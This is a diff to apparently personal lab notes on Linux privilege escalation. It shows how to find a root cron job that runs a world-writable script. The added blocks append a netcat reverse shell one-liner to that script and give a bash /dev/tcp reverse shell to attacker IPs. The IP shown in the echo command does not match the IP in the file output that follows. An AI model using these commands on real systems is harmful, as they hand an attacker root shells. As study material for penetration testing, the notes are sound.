@@ -1,6 +1,50 @@
 # Cron Jobs
 
+{% code title=" Inspecting the cron log file" overflow="wrap" lineNumbers="true" %}
+```
+joe@debian-privesc:~$ grep "CRON" /var/log/syslog
+...
+Aug 25 04:56:07 debian-privesc cron[463]: (CRON) INFO (pidfile fd = 3)
+Aug 25 04:56:07 debian-privesc cron[463]: (CRON) INFO (Running @reboot jobs)
+Aug 25 04:57:01 debian-privesc CRON[918]:  (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
+Aug 25 04:58:01 debian-privesc CRON[1043]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
+Aug 25 04:59:01 debian-privesc CRON[1223]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
+```
+{% endcode %}
+
+{% code title="Showing the content and permissions of the user_backups.sh script" overflow="wrap" lineNumbers="true" %}
+```
+joe@debian-privesc:~$ cat /home/joe/.scripts/user_backups.sh
+#!/bin/bash
+
+cp -rf /home/joe/ /var/backups/joe/
+
+joe@debian-privesc:~$ ls -lah /home/joe/.scripts/user_backups.sh
+-rwxrwxrw- 1 root root 49 Aug 25 05:12 /home/joe/.scripts/user_backups.sh
+```
+{% endcode %}
+
+{% code title="Inserting a reverse shell one-liner in user_backups.sh" overflow="wrap" lineNumbers="true" %}
+```
+joe@debian-privesc:~$ cd .scripts
+
+joe@debian-privesc:~/.scripts$ echo >> user_backups.sh
+
+joe@debian-privesc:~/.scripts$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.118.2 1234 >/tmp/f" >> user_backups.sh
+
+joe@debian-privesc:~/.scripts$ cat user_backups.sh
+#!/bin/bash
+
+cp -rf /home/joe/ /var/backups/joe/
+
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f
+```
+{% endcode %}
+
+```
 cat /etc/crontab
+```
 
 The script will use the tools available on the target system to launch a reverse shell.\
 Two points to note;
@@ -11,8 +55,13 @@ Two points to note;
 The file should look like this;\
 
 
-![](https://i.imgur.com/579yg6H.png)\
+![](https://i.imgur.com/579yg6H.png)
 
+{% code title="oneliner to get a reverse shell" overflow="wrap" lineNumbers="true" %}
+```
+bash -i >& /dev/tcp/192.168.45.245/4444 0>&1
+```
+{% endcode %}
 
 We will now run a listener on our attacking machine to receive the incoming connection.
 
